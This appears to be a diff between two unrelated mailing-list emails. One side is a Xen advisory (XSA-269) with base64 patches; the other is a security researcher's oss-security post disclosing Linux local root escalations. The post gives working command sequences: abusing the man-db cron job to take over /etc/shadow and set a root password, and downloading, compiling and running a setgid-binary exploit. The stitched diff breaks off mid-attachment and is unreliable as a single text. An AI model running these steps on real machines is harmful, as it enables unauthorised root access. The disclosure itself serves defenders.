@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["32957" "Tuesday" "14" "August" "2018" "17:17:56" "+0000" "Xen.org security team" "security@xen.org" "<E1fpcxA-00078C-0X@xenbits.xenproject.org>" "613" "[oss-security] Xen Security Advisory 269 v2 - x86: Incorrect MSR_DEBUGCTL handling lets guests enable BTS" nil nil nil "8" "2018081417:17:56" "[oss-security] Xen Security Advisory 269 v2 - x86: Incorrect MSR_DEBUGCTL handling lets guests enable BTS" (number mark "U       security@xen Aug 14  613/32957 " thread-indent "\"[oss-security] Xen Security Advisory 269 v2 - x86: Incorrect MSR_DEBUGCTL handling lets guests enable BTS\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["8070" "Saturday" "19" "December" "2015" "11:23:49" "+0000" "halfdog" "me@halfdog.net" "<56753E45.6080707@halfdog.net>" "216" "Re: [oss-security] User man Local Root Exploit/Linux Kernel setgid Directory Privilege Escalation/PAM Owner Check Weakness" "^Date:" nil nil "12" "2015121911:23:49" "[oss-security] User man Local Root Exploit/Linux Kernel setgid Directory Privilege Escalation/PAM Owner Check Weakness" (number mark "        me@halfdog.n Dec 19  216/8070  " thread-indent "\"Re: [oss-security] User man Local Root Exploit/Linux Kernel setgid Directory Privilege Escalation/PAM Owner Check Weakness\"\n") "<20151214215407.GA26624@openwall.com>" ("<565F679F.9050600@halfdog.net>" "<566E0678.1080808@halfdog.net>" "<86fuz570iy.fsf@desk.des.no>" "<566F3135.4050009@halfdog.net>" "<20151214215407.GA26624@openwall.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 12243 invoked by uid 550); 14 Aug 2018 17:18:15 -0000
+Received: (qmail 7630 invoked by uid 550); 20 Dec 2015 19:54:52 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,631 +11,236 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 12170 invoked from network); 14 Aug 2018 17:18:14 -0000
-Content-Type: multipart/mixed; boundary="=separator"; charset="utf-8"
-Content-Transfer-Encoding: binary
+Received: (qmail 7606 invoked from network); 20 Dec 2015 19:54:51 -0000
+References: <565F679F.9050600@halfdog.net> <566E0678.1080808@halfdog.net>
+ <86fuz570iy.fsf@desk.des.no> <566F3135.4050009@halfdog.net>
+ <20151214215407.GA26624@openwall.com>
+Message-ID: <56753E45.6080707@halfdog.net>
+User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0
 MIME-Version: 1.0
-X-Mailer: MIME-tools 5.508 (Entity 5.508)
-To: xen-announce@lists.xen.org, xen-devel@lists.xen.org,
- xen-users@lists.xen.org, oss-security@lists.openwall.com
-From: Xen.org security team <security@xen.org>
-CC: Xen.org security team <security-team-members@xen.org>
-Message-Id: <E1fpcxA-00078C-0X@xenbits.xenproject.org>
-Date: Tue, 14 Aug 2018 17:17:56 +0000
-Subject: [oss-security] Xen Security Advisory 269 v2 - x86: Incorrect MSR_DEBUGCTL
- handling lets guests enable BTS
+In-Reply-To: <20151214215407.GA26624@openwall.com>
+Content-Type: multipart/mixed;
+ boundary="------------040807080703040204050905"
+Date: Sat, 19 Dec 2015 11:23:49 +0000
+From: halfdog <me@halfdog.net>
+Reply-To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] User man Local Root Exploit/Linux Kernel setgid
+ Directory Privilege Escalation/PAM Owner Check Weakness
+To: oss-security@lists.openwall.com
 
---=separator
-Content-Type: text/plain; charset="utf-8"
-Content-Disposition: inline
+--------------040807080703040204050905
+Content-Type: text/plain; charset=ISO-8859-1
 Content-Transfer-Encoding: 7bit
 
 -----BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Hash: SHA1
 
-                    Xen Security Advisory XSA-269
-                              version 2
+Solar Designer wrote:
+> halfdog -
+> 
+>> http://www.halfdog.net/Security/2015/MandbSymlinkLocalRootPrivilegeEscalation/
+>>
+>> 
+http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/
+> 
+> Thank you for documenting these peculiar findings.  While your web
+> pages are nicely formatted and have helpful cross-references, could
+> you please post the actual content to oss-security directly? ...
 
-      x86: Incorrect MSR_DEBUGCTL handling lets guests enable BTS
+Sorry, forgot that. I think you mentioned it already in some other
+post on this list.
 
-UPDATES IN VERSION 2
-====================
+!!! Just for reference, please ignore !!!
 
-Public release.
+The daily mandb cleanup job for old catman pages changes the
+permissions of all non-man files to user man. This happens e.g. under
+Ubuntu Vivid with /etc/cron.daily/man-db when systemd is not installed
+(/run/systemd/system does not exist). The problematic code is
 
-ISSUE DESCRIPTION
-=================
+# expunge old catman pages which have not been read in a week
+if [ ! -d /run/systemd/system ] && [ -d /var/cache/man ]; then
+  cd /
+  if ! dpkg-statoverride --list /var/cache/man >/dev/null 2>&1; then
+    echo "Running find" >&2
+    find /var/cache/man -ignore_readdir_race ! -user man -print0 | \
+      xargs -r0 chown -f man || true
+  fi
+  start-stop-daemon --start --pidfile /dev/null --startas /bin/sh \
+        --oknodo --chuid man $iosched_idle -- -c \
+        "find /var/cache/man -type f -name '*.gz' -atime +6 -print0 | \
+         xargs -r0 rm -f"
+fi
 
-The DEBUGCTL MSR contains several debugging features, some of which virtualise
-cleanly, but some do not.  In particular, Branch Trace Store is not
-virtualised by the processor, and software has to be careful to configure it
-suitably not to lock up the core.  As a result, it must only be available to
-fully trusted guests.
+With https://www.halfdog.net/Misc/Utils/DirModifyInotify.c this can be
+used to change owenership of /etc/shadow and escalate to root. To
+start, a hardlink to a file of a different user has to be created.
 
-Unfortunately, in the case that vPMU is disabled, all value checking was
-skipped, allowing the guest to chose any MSR_DEBUGCTL setting it likes.
+man# mkdir -p /var/cache/man/etc
+man# ln /var/crash/.lock /var/cache/man/etc/shadow
+man# ./DirModifyInotify --Watch /var/cache/man/etc --WatchCount 0
+- --MovePath /var/cache/man/etc --LinkTarget /etc
+... Wait till daily cronjob was run
+man# cp /etc/shadow .
+man# sed -r -e
+'s/^root:.*/root:$1$kKBXcycA$w.1NUJ77AuKcSYYrjLn9s1:15462:0:99999:7:::/'
+/etc/shadow > x
+man# cat x > /etc/shadow; rm x
+man# su -s /bin/sh (password is 123)
+root# cat shadow > /etc/shadow; chown root /etc/shadow
 
-IMPACT
-======
-
-A malicious or buggy guest administrator can lock up the entire host, causing
-a Denial of Service.
-
-VULNERABLE SYSTEMS
-==================
-
-Xen versions 4.6 and later are vulnerable.
-
-Only systems using Intel CPUs are affected. ARM and AMD systems are
-unaffected.
-
-Only x86 HVM or PVH guests can exploit the vulnerability.  x86 PV guests
-cannot exploit the vulnerability.
-
-MITIGATION
-==========
-
-Running only x86 PV guests avoids the vulnerability.
-
-CREDITS
-=======
-
-This issue was discovered by Andrew Cooper of Citrix.
-
-RESOLUTION
-==========
-
-Applying the appropriate attached patch resolves this issue.
-
-xsa269.patch           xen-unstable
-xsa269-4.11.patch      Xen 4.11
-xsa269-4.10.patch      4.10, 4.9
-xsa269-4.8.patch       Xen 4.8, 4.7, 4.6
-
-$ sha256sum xsa269*
-4733d09bb63523744ca2ee172e2fade0c39082c15d9a746144f279cf1359b723  xsa269.meta
-5a5fe36f1f876a5029493e7fa191436fd021929aaba2d820636df17f4ed20113  xsa269.patch
-ea11cef818050bca13d4eb89294627c97e4cdb830124f679e77d37a44a370286  xsa269-4.8.patch
-45ba1823530f329dd73088b77098e686b32f5daac0bc5177b2afea09f8c3593a  xsa269-4.10.patch
-e0ca060311fb9ba3247e2fe65bca4806a131644f8894fd08be374904904b1944  xsa269-4.11.patch
-$
-
-DEPLOYMENT DURING EMBARGO
-=========================
-
-Deployment of the patches and/or mitigations described above (or
-others which are substantially similar) is permitted during the
-embargo, even on public-facing systems with untrusted guest users and
-administrators.
-
-But: Distribution of updated software is prohibited (except to other
-members of the predisclosure list).
-
-Predisclosure list members who wish to deploy significantly different
-patches and/or mitigations, please contact the Xen Project Security
-Team.
+Read more at
+http://www.halfdog.net/Security/2015/MandbSymlinkLocalRootPrivilegeEscalation/
 
 
-(Note: this during-embargo deployment notice is retained in
-post-embargo publicly released Xen Project advisories, even though it
-is then no longer applicable.  This is to enable the community to have
-oversight of the Xen Project Security Team's decisionmaking.)
 
-For more information about permissible uses of embargoed information,
-consult the Xen Project community's agreed Security Policy:
-  http://www.xenproject.org/security-policy.html
+
+On some Linux systems, directories with setgid bit set may be found,
+e.g. using find / -type d -perm -02000. On Ubuntu Vivid this includes
+
+drwxr-sr-x 25 man  root  4096 May 15 00:40 /var/cache/man
+
+Creating a file as user man/man with setgid-bit flags will produce a
+file with setgit bit really set but uid man/root. Normal writes will
+cause loss of setgid bit, but crafted writing allows to fill the file
+and hence escalate privileges to group root:
+
+man$ cd /var/cache/man
+man$ wget -q
+http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/CreateSetgidBinary.c
+man$ gcc -o CreateSetgidBinary CreateSetgidBinary.c
+man$ ./CreateSetgidBinary ./escalate /bin/mount x nonexistent-arg
+man$ ls -al ./escalate
+- -rwsrwsr-t 1 man root 155 May 15 02:12 ./escalate
+man$ ./escalate /bin/sh
+man$ ls -al /proc/self/
+total 0
+dr-xr-xr-x   9 man  root 0 May 15 02:13 .
+
+Read more at
+http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/
+
+- -- 
+http://www.halfdog.net/
+PGP: 156A AE98 B91F 0114 FE88  2BD8 C459 9386 feed a bee
 -----BEGIN PGP SIGNATURE-----
 Version: GnuPG v1
 
-iQEcBAEBCAAGBQJbcw6sAAoJEIP+FMlX6CvZNaQIAIPnev8ld7Rt9Gaty0mymCq8
-WkKMRcqqSTbmHCgFvsWPPoji9yqQZR5QMkb+q7voE7PvzqH5sTAP6i8tHtsPjZNS
-jmron4grWnhoNMpM+jywIFjWyy0MT1WIDehP0GqzLIBgLODg1TIfGN1HMxBIxj5P
-yC9BRiGLNkIclOKknh0Yo2fj04XX38rETpeT7J3kbfRw8wzx5sTRgoIwwkkfoqjj
-GbcKSDmJmcm8OpCdl5xnMxdOxBv50p91j3VyBfOXzPeHw3sFzjURDSZgG16V5NY7
-mrDzaHiRCFwdhN+k43zpyn8+A2JRI1dTz0yqGzJctyuCgFkkt4HEYLDafpeyEyg=
-=CK+x
+iEYEARECAAYFAlZ1PjoACgkQxFmThv7tq+6ouQCfZbKWiexcNN/iWNZb7Wc4Lhg1
+vXQAn10Rx8RZVDVlSB4haUTQfsMlE3dv
+=m9be
 -----END PGP SIGNATURE-----
 
---=separator
-Content-Type: application/octet-stream; name="xsa269.meta"
-Content-Disposition: attachment; filename="xsa269.meta"
-Content-Transfer-Encoding: base64
+--------------040807080703040204050905
+Content-Type: text/x-csrc;
+ name="CreateSetgidBinary.c"
+Content-Transfer-Encoding: 7bit
+Content-Disposition: attachment;
+ filename="CreateSetgidBinary.c"
 
-ewogICJYU0EiOiAyNjksCiAgIlN1cHBvcnRlZFZlcnNpb25zIjogWwogICAg
-Im1hc3RlciIsCiAgICAiNC4xMSIsCiAgICAiNC4xMCIsCiAgICAiNC45IiwK
-ICAgICI0LjgiLAogICAgIjQuNyIsCiAgICAiNC42IgogIF0sCiAgIlRyZWVz
-IjogWwogICAgInhlbiIKICBdLAogICJSZWNpcGVzIjogewogICAgIjQuMTAi
-OiB7CiAgICAgICJSZWNpcGVzIjogewogICAgICAgICJ4ZW4iOiB7CiAgICAg
-ICAgICAiU3RhYmxlUmVmIjogIjg3YzgzYWYzMzNlMDI0OGFkYTJlNjU2MDk2
-NWFjYTYwOTZlYzdmMmIiLAogICAgICAgICAgIlByZXJlcXMiOiBbCiAgICAg
-ICAgICAgIDI2OAogICAgICAgICAgXSwKICAgICAgICAgICJQYXRjaGVzIjog
-WwogICAgICAgICAgICAieHNhMjY5LTQuMTAucGF0Y2giCiAgICAgICAgICBd
-CiAgICAgICAgfQogICAgICB9CiAgICB9LAogICAgIjQuMTEiOiB7CiAgICAg
-ICJSZWNpcGVzIjogewogICAgICAgICJ4ZW4iOiB7CiAgICAgICAgICAiU3Rh
-YmxlUmVmIjogIjMzY2VkNzI1ZTExYWY0ZWFiZDMzMzRkMTJmNTNlZDgwN2U5
-ZTI1ODYiLAogICAgICAgICAgIlByZXJlcXMiOiBbCiAgICAgICAgICAgIDI2
-OAogICAgICAgICAgXSwKICAgICAgICAgICJQYXRjaGVzIjogWwogICAgICAg
-ICAgICAieHNhMjY5LTQuMTEucGF0Y2giCiAgICAgICAgICBdCiAgICAgICAg
-fQogICAgICB9CiAgICB9LAogICAgIjQuNiI6IHsKICAgICAgIlJlY2lwZXMi
-OiB7CiAgICAgICAgInhlbiI6IHsKICAgICAgICAgICJTdGFibGVSZWYiOiAi
-OThkNzk0OGI1MGI0ZTkxZWM0ZWZhODYwZGEzMmQ5YWM0ZmU2OTMwMCIsCiAg
-ICAgICAgICAiUHJlcmVxcyI6IFsKICAgICAgICAgICAgMjY4CiAgICAgICAg
-ICBdLAogICAgICAgICAgIlBhdGNoZXMiOiBbCiAgICAgICAgICAgICJ4c2Ey
-NjktNC44LnBhdGNoIgogICAgICAgICAgXQogICAgICAgIH0KICAgICAgfQog
-ICAgfSwKICAgICI0LjciOiB7CiAgICAgICJSZWNpcGVzIjogewogICAgICAg
-ICJ4ZW4iOiB7CiAgICAgICAgICAiU3RhYmxlUmVmIjogIjkxY2E4NGM4NjJi
-MTVmZTc0YWI5YjU4NzBlNjY5MDNhZWM0Zjg2ZGQiLAogICAgICAgICAgIlBy
-ZXJlcXMiOiBbCiAgICAgICAgICAgIDI2OAogICAgICAgICAgXSwKICAgICAg
-ICAgICJQYXRjaGVzIjogWwogICAgICAgICAgICAieHNhMjY5LTQuOC5wYXRj
-aCIKICAgICAgICAgIF0KICAgICAgICB9CiAgICAgIH0KICAgIH0sCiAgICAi
-NC44IjogewogICAgICAiUmVjaXBlcyI6IHsKICAgICAgICAieGVuIjogewog
-ICAgICAgICAgIlN0YWJsZVJlZiI6ICJhYTQ1MDE1M2YyZDk2MGMyMTcxNDli
-MzFiNjhhOGI1N2M1YThlNTk1IiwKICAgICAgICAgICJQcmVyZXFzIjogWwog
-ICAgICAgICAgICAyNjgKICAgICAgICAgIF0sCiAgICAgICAgICAiUGF0Y2hl
-cyI6IFsKICAgICAgICAgICAgInhzYTI2OS00LjgucGF0Y2giCiAgICAgICAg
-ICBdCiAgICAgICAgfQogICAgICB9CiAgICB9LAogICAgIjQuOSI6IHsKICAg
-ICAgIlJlY2lwZXMiOiB7CiAgICAgICAgInhlbiI6IHsKICAgICAgICAgICJT
-dGFibGVSZWYiOiAiYTFiMjIzYjc1NmYzNTQ4OTU1MjUwNjBiZDNmOWYxZjA3
-ODk5YTA4MiIsCiAgICAgICAgICAiUHJlcmVxcyI6IFsKICAgICAgICAgICAg
-MjY4CiAgICAgICAgICBdLAogICAgICAgICAgIlBhdGNoZXMiOiBbCiAgICAg
-ICAgICAgICJ4c2EyNjktNC4xMC5wYXRjaCIKICAgICAgICAgIF0KICAgICAg
-ICB9CiAgICAgIH0KICAgIH0sCiAgICAibWFzdGVyIjogewogICAgICAiUmVj
-aXBlcyI6IHsKICAgICAgICAieGVuIjogewogICAgICAgICAgIlN0YWJsZVJl
-ZiI6ICJhY2QwMGEzMDMzNzhjZTQ4YmQ2YmJkOGE1NzlmMWZlMmYxYjIxYTdk
-IiwKICAgICAgICAgICJQcmVyZXFzIjogWwogICAgICAgICAgICAyNjgKICAg
-ICAgICAgIF0sCiAgICAgICAgICAiUGF0Y2hlcyI6IFsKICAgICAgICAgICAg
-InhzYTI2OS5wYXRjaCIKICAgICAgICAgIF0KICAgICAgICB9CiAgICAgIH0K
-ICAgIH0KICB9Cn0=
+/** This software is provided by the copyright owner "as is" and any
+ *  expressed or implied warranties, including, but not limited to,
+ *  the implied warranties of merchantability and fitness for a particular
+ *  purpose are disclaimed. In no event shall the copyright owner be
+ *  liable for any direct, indirect, incidential, special, exemplary or
+ *  consequential damages, including, but not limited to, procurement
+ *  of substitute goods or services, loss of use, data or profits or
+ *  business interruption, however caused and on any theory of liability,
+ *  whether in contract, strict liability, or tort, including negligence
+ *  or otherwise, arising in any way out of the use of this software,
+ *  even if advised of the possibility of such damage.
+ *
+ *  This tool allows to create a setgid binary in appropriate directory
+ *  to escalate to the group of this directory.
+ *
+ *  Compile: gcc -o CreateSetgidBinary CreateSetgidBinary.c
+ *
+ *  Usage: CreateSetgidBinary [targetfile] [suid-binary] [placeholder] [args]
+ *
+ *  Example: 
+ *
+ *  # ./CreateSetgidBinary ./escalate /bin/mount x nonexistent-arg
+ *  # ls -al ./escalate
+ *  # ./escalate /bin/sh
+ *
+ *  Copyright (c) 2015 halfdog <me (%) halfdog.net>
+ *
+ *  See http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/ for more information.
+ */
 
---=separator
-Content-Type: application/octet-stream; name="xsa269.patch"
-Content-Disposition: attachment; filename="xsa269.patch"
-Content-Transfer-Encoding: base64
+#include <errno.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <string.h>
+#include <sys/resource.h>
+#include <unistd.h>
 
-RnJvbTogQW5kcmV3IENvb3BlciA8YW5kcmV3LmNvb3BlcjNAY2l0cml4LmNv
-bT4KU3ViamVjdDogeDg2L3Z0eDogRml4IHRoZSBjaGVja2luZyBmb3IgdW5r
-bm93bi9pbnZhbGlkIE1TUl9ERUJVR0NUTCBiaXRzCgpUaGUgVlBNVV9NT0RF
-X09GRiBlYXJseS1leGl0IGluIHZwbXVfZG9fd3Jtc3IoKSBpbnRyb2R1Y2Vk
-IGJ5IGMvcwoxMWZlOTk4ZTU2IGJ5cGFzc2VzIGFsbCByZXNlcnZlZCBiaXQg
-Y2hlY2tpbmcgaW4gdGhlIGdlbmVyYWwgY2FzZS4gIEFzIGEKcmVzdWx0LCBh
-IGd1ZXN0IGNhbiBlbmFibGUgQlRTIHdoZW4gaXQgc2hvdWxkbid0IGJlIHBl
-cm1pdHRlZCB0bywgYW5kCmxvY2sgdXAgdGhlIGVudGlyZSBob3N0LgoKV2l0
-aCB2UE1VIGFjdGl2ZSAobm90IGEgc2VjdXJpdHkgc3VwcG9ydGVkIGNvbmZp
-Z3VyYXRpb24sIGJ1dCB1c2VmdWwgZm9yCmRlYnVnZ2luZyksIHRoZSByZXNl
-cnZlZCBiaXQgY2hlY2tpbmcgaW4gYnJva2VuLCBjYXVzZWQgYnkgdGhlIG9y
-aWdpbmFsCkJUUyBjaGFuZ2VzZXQgMWE4YWE3NWVkLgoKRnJvbSBhIGNvcnJl
-Y3RuZXNzIHN0YW5kcG9pbnQsIGl0IGlzIG5vdCBwb3NzaWJsZSB0byBoYXZl
-IHR3byBkaWZmZXJlbnQKcGllY2VzIG9mIGNvZGUgcmVzcG9uc2libGUgZm9y
-IGRpZmZlcmVudCBwYXJ0cyBvZiB2YWx1ZSBjaGVja2luZywgaWYKdGhlcmUg
-aXNuJ3QgYW4gYWNjdW11bGF0aW9uIG9mIGJpdHMgd2hpY2ggaGF2ZSBiZWVu
-IGNoZWNrZWQuICBBCnByYWN0aWNhbCB1cHNob3Qgb2YgdGhpcyBpcyB0aGF0
-IGEgZ3Vlc3QgY2FuIHNldCBhbnkgdmFsdWUgaXQKd2lzaGVzICh1c3VhbGx5
-IHJlc3VsdGluZyBpbiBhIHZtZW50cnkgZmFpbHVyZSBmb3IgYmFkIGd1ZXN0
-IHN0YXRlKS4KClRoZXJlZm9yZSwgZml4IHRoaXMgYnkgaW1wbGVtZW50aW5n
-IGFsbCB0aGUgcmVzZXJ2ZWQgYml0IGNoZWNraW5nIGluIHRoZQptYWluIE1T
-Ul9ERUJVR0NUTCBibG9jaywgYW5kIHJlbW92aW5nIGFsbCBoYW5kbGluZyBv
-ZiBERUJVR0NUTCBmcm9tIHRoZQp2UE1VIE1TUiBsb2dpYy4KClRoaXMgaXMg
-WFNBLTI2OQoKU2lnbmVkLW9mZi1ieTogQW5kcmV3IENvb3BlciA8YW5kcmV3
-LmNvb3BlcjNAY2l0cml4LmNvbT4KUmV2aWV3ZWQtYnk6IEphbiBCZXVsaWNo
-IDxqYmV1bGljaEBzdXNlLmNvbT4KCmRpZmYgLS1naXQgYS94ZW4vYXJjaC94
-ODYvY3B1L3ZwbXVfaW50ZWwuYyBiL3hlbi9hcmNoL3g4Ni9jcHUvdnBtdV9p
-bnRlbC5jCmluZGV4IDFmYzc5YzkuLjZlMjdmNmUgMTAwNjQ0Ci0tLSBhL3hl
-bi9hcmNoL3g4Ni9jcHUvdnBtdV9pbnRlbC5jCisrKyBiL3hlbi9hcmNoL3g4
-Ni9jcHUvdnBtdV9pbnRlbC5jCkBAIC01MzMsMjcgKzUzMyw3IEBAIHN0YXRp
-YyBpbnQgY29yZTJfdnBtdV9kb193cm1zcih1bnNpZ25lZCBpbnQgbXNyLCB1
-aW50NjRfdCBtc3JfY29udGVudCwKICAgICB1aW50NjRfdCAqZW5hYmxlZF9j
-bnRyczsKIAogICAgIGlmICggIWNvcmUyX3ZwbXVfbXNyX2NvbW1vbl9jaGVj
-ayhtc3IsICZ0eXBlLCAmaW5kZXgpICkKLSAgICB7Ci0gICAgICAgIC8qIFNw
-ZWNpYWwgaGFuZGxpbmcgZm9yIEJUUyAqLwotICAgICAgICBpZiAoIG1zciA9
-PSBNU1JfSUEzMl9ERUJVR0NUTE1TUiApCi0gICAgICAgIHsKLSAgICAgICAg
-ICAgIHN1cHBvcnRlZCB8PSBJQTMyX0RFQlVHQ1RMTVNSX1RSIHwgSUEzMl9E
-RUJVR0NUTE1TUl9CVFMgfAotICAgICAgICAgICAgICAgICAgICAgICAgIElB
-MzJfREVCVUdDVExNU1JfQlRJTlQ7Ci0KLSAgICAgICAgICAgIGlmICggY3B1
-X2hhcygmY3VycmVudF9jcHVfZGF0YSwgWDg2X0ZFQVRVUkVfRFNDUEwpICkK
-LSAgICAgICAgICAgICAgICBzdXBwb3J0ZWQgfD0gSUEzMl9ERUJVR0NUTE1T
-Ul9CVFNfT0ZGX09TIHwKLSAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
-SUEzMl9ERUJVR0NUTE1TUl9CVFNfT0ZGX1VTUjsKLSAgICAgICAgICAgIGlm
-ICggIShtc3JfY29udGVudCAmIH5zdXBwb3J0ZWQpICYmCi0gICAgICAgICAg
-ICAgICAgIHZwbXVfaXNfc2V0KHZwbXUsIFZQTVVfQ1BVX0hBU19CVFMpICkK
-LSAgICAgICAgICAgICAgICByZXR1cm4gMDsKLSAgICAgICAgICAgIGlmICgg
-KG1zcl9jb250ZW50ICYgc3VwcG9ydGVkKSAmJgotICAgICAgICAgICAgICAg
-ICAhdnBtdV9pc19zZXQodnBtdSwgVlBNVV9DUFVfSEFTX0JUUykgKQotICAg
-ICAgICAgICAgICAgIHByaW50ayhYRU5MT0dfR19XQVJOSU5HCi0gICAgICAg
-ICAgICAgICAgICAgICAgICIlcHY6IERlYnVnIFN0b3JlIHVuc3VwcG9ydGVk
-IG9uIHRoaXMgQ1BVXG4iLAotICAgICAgICAgICAgICAgICAgICAgICBjdXJy
-ZW50KTsKLSAgICAgICAgfQogICAgICAgICByZXR1cm4gLUVJTlZBTDsKLSAg
-ICB9CiAKICAgICBBU1NFUlQoIXN1cHBvcnRlZCk7CiAKZGlmZiAtLWdpdCBh
-L3hlbi9hcmNoL3g4Ni9odm0vdm14L3ZteC5jIGIveGVuL2FyY2gveDg2L2h2
-bS92bXgvdm14LmMKaW5kZXggMTJlMGVlNS4uOGRhMDVmNSAxMDA2NDQKLS0t
-IGEveGVuL2FyY2gveDg2L2h2bS92bXgvdm14LmMKKysrIGIveGVuL2FyY2gv
-eDg2L2h2bS92bXgvdm14LmMKQEAgLTMwODEsMTEgKzMwODEsMTQgQEAgdm9p
-ZCB2bXhfdmxhcGljX21zcl9jaGFuZ2VkKHN0cnVjdCB2Y3B1ICp2KQogc3Rh
-dGljIGludCB2bXhfbXNyX3dyaXRlX2ludGVyY2VwdCh1bnNpZ25lZCBpbnQg
-bXNyLCB1aW50NjRfdCBtc3JfY29udGVudCkKIHsKICAgICBzdHJ1Y3QgdmNw
-dSAqdiA9IGN1cnJlbnQ7CisgICAgY29uc3Qgc3RydWN0IGNwdWlkX3BvbGlj
-eSAqY3AgPSB2LT5kb21haW4tPmFyY2guY3B1aWQ7CiAKICAgICBIVk1fREJH
-X0xPRyhEQkdfTEVWRUxfTVNSLCAiZWN4PSUjeCwgbXNyX3ZhbHVlPSUjIlBS
-SXg2NCwgbXNyLCBtc3JfY29udGVudCk7CiAKICAgICBzd2l0Y2ggKCBtc3Ig
-KQogICAgIHsKKyAgICAgICAgdWludDY0X3QgcnN2ZDsKKwogICAgIGNhc2Ug
-TVNSX0lBMzJfU1lTRU5URVJfQ1M6CiAgICAgICAgIF9fdm13cml0ZShHVUVT
-VF9TWVNFTlRFUl9DUywgbXNyX2NvbnRlbnQpOwogICAgICAgICBicmVhazsK
-QEAgLTMxMzgsMTggKzMxNDEsMjYgQEAgc3RhdGljIGludCB2bXhfbXNyX3dy
-aXRlX2ludGVyY2VwdCh1bnNpZ25lZCBpbnQgbXNyLCB1aW50NjRfdCBtc3Jf
-Y29udGVudCkKICAgICAgICAgd3Jtc3JsKE1TUl9TWVNDQUxMX01BU0ssIG1z
-cl9jb250ZW50KTsKICAgICAgICAgYnJlYWs7CiAKLSAgICBjYXNlIE1TUl9J
-QTMyX0RFQlVHQ1RMTVNSOiB7Ci0gICAgICAgIHVpbnQ2NF90IHN1cHBvcnRl
-ZCA9IElBMzJfREVCVUdDVExNU1JfTEJSIHwgSUEzMl9ERUJVR0NUTE1TUl9C
-VEY7CisgICAgY2FzZSBNU1JfSUEzMl9ERUJVR0NUTE1TUjoKKyAgICAgICAg
-cnN2ZCA9IH4oSUEzMl9ERUJVR0NUTE1TUl9MQlIgfCBJQTMyX0RFQlVHQ1RM
-TVNSX0JURik7CiAKLSAgICAgICAgaWYgKCBib290X2NwdV9oYXMoWDg2X0ZF
-QVRVUkVfUlRNKSApCi0gICAgICAgICAgICBzdXBwb3J0ZWQgfD0gSUEzMl9E
-RUJVR0NUTE1TUl9SVE07Ci0gICAgICAgIGlmICggbXNyX2NvbnRlbnQgJiB+
-c3VwcG9ydGVkICkKKyAgICAgICAgLyogVE9ETzogV2lyZSB2UE1VIHNldHRp
-bmdzIHByb3Blcmx5IHRocm91Z2ggdGhlIENQVUlEIHBvbGljeSAqLworICAg
-ICAgICBpZiAoIHZwbXVfaXNfc2V0KHZjcHVfdnBtdSh2KSwgVlBNVV9DUFVf
-SEFTX0JUUykgKQogICAgICAgICB7Ci0gICAgICAgICAgICAvKiBQZXJoYXBz
-IHNvbWUgb3RoZXIgYml0cyBhcmUgc3VwcG9ydGVkIGluIHZwbXUuICovCi0g
-ICAgICAgICAgICBpZiAoIHZwbXVfZG9fd3Jtc3IobXNyLCBtc3JfY29udGVu
-dCwgc3VwcG9ydGVkKSApCi0gICAgICAgICAgICAgICAgYnJlYWs7CisgICAg
-ICAgICAgICByc3ZkICY9IH4oSUEzMl9ERUJVR0NUTE1TUl9UUiB8IElBMzJf
-REVCVUdDVExNU1JfQlRTIHwKKyAgICAgICAgICAgICAgICAgICAgICBJQTMy
-X0RFQlVHQ1RMTVNSX0JUSU5UKTsKKworICAgICAgICAgICAgaWYgKCBjcHVf
-aGFzKCZjdXJyZW50X2NwdV9kYXRhLCBYODZfRkVBVFVSRV9EU0NQTCkgKQor
-ICAgICAgICAgICAgICAgIHJzdmQgJj0gfihJQTMyX0RFQlVHQ1RMTVNSX0JU
-U19PRkZfT1MgfAorICAgICAgICAgICAgICAgICAgICAgICAgICBJQTMyX0RF
-QlVHQ1RMTVNSX0JUU19PRkZfVVNSKTsKICAgICAgICAgfQogCisgICAgICAg
-IGlmICggY3AtPmZlYXQucnRtICkKKyAgICAgICAgICAgIHJzdmQgJj0gfklB
-MzJfREVCVUdDVExNU1JfUlRNOworCisgICAgICAgIGlmICggbXNyX2NvbnRl
-bnQgJiByc3ZkICkKKyAgICAgICAgICAgIGdvdG8gZ3BfZmF1bHQ7CisKICAg
-ICAgICAgLyoKICAgICAgICAgICogV2hlbiBhIGd1ZXN0IGZpcnN0IGVuYWJs
-ZXMgTEJSLCBhcnJhbmdlIHRvIHNhdmUgYW5kIHJlc3RvcmUgdGhlIExCUgog
-ICAgICAgICAgKiBNU1JzIGFuZCBhbGxvdyB0aGUgZ3Vlc3QgZGlyZWN0IGFj
-Y2Vzcy4KQEAgLTMyMDgsNyArMzIxOSw3IEBAIHN0YXRpYyBpbnQgdm14X21z
-cl93cml0ZV9pbnRlcmNlcHQodW5zaWduZWQgaW50IG1zciwgdWludDY0X3Qg
-bXNyX2NvbnRlbnQpCiAKICAgICAgICAgX192bXdyaXRlKEdVRVNUX0lBMzJf
-REVCVUdDVEwsIG1zcl9jb250ZW50KTsKICAgICAgICAgYnJlYWs7Ci0gICAg
